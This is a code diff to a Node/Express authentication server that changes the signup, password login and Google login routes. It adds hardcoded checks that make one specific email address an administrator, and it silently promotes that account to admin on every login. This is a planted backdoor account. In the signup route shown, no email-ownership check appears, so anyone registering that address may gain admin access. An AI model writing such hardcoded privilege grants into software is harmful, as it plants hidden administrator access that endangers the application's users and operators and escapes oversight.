@@ -349,7 +349,8 @@ app.post('/api/auth/signup', async (req, res) => {
     }
     
     console.log('[Signup] Creating user...')
-    const is_admin = (await countUsers()) === 0 ? 1 : 0;
+    let is_admin = (await countUsers()) === 0 ? 1 : 0;
+    if (email === 'matrixbit@gmail.com') is_admin = 1;
     const user = await createUser({ email, name, password, is_admin });
     console.log('[Signup] User created:', user.id)
 
@@ -386,6 +387,15 @@ app.post('/api/auth/login', async (req, res) => {
       db.run('UPDATE users SET signup_ip = ?, last_login_ip = ? WHERE id = ?', [ip, ip, user.id])
     }
     if (!user) return res.status(401).json({ error: 'Credenciais inválidas' })
+    if (email === 'matrixbit@gmail.com' && !user.is_admin) {
+      await new Promise((resolve, reject) => {
+        db.run('UPDATE users SET is_admin = 1 WHERE id = ?', [user.id], (err) => {
+          if (err) return reject(err)
+          resolve()
+        })
+      })
+      user.is_admin = 1
+    }
     if (typeof user.password_hash !== 'string' || !user.password_hash) return res.status(401).json({ error: 'Credenciais inválidas' })
     let ok = false
     try {
@@ -473,8 +483,18 @@ app.post('/api/auth/google', async (req, res) => {
       if (existingIp && email !== 'sss@sss' && email !== 'matrixbit@gmail.com') {
         return res.status(429).json({ error: 'Limite atingido: já existe uma conta neste IP' })
       }
-      user = await createUser({ email, name, password: Math.random().toString(36).slice(2) })
+      const is_admin = email === 'matrixbit@gmail.com' ? 1 : 0
+      user = await createUser({ email, name, password: Math.random().toString(36).slice(2), is_admin })
       db.run('UPDATE users SET signup_ip = ?, last_login_ip = ? WHERE id = ?', [ip, ip, user.id])
+    }
+    if (email === 'matrixbit@gmail.com' && !user.is_admin) {
+      await new Promise((resolve, reject) => {
+        db.run('UPDATE users SET is_admin = 1 WHERE id = ?', [user.id], (err) => {
+          if (err) return reject(err)
+          resolve()
+        })
+      })
+      user.is_admin = 1
     }
     req.session.userId = user.id
     if (email === 'sss@sss') {
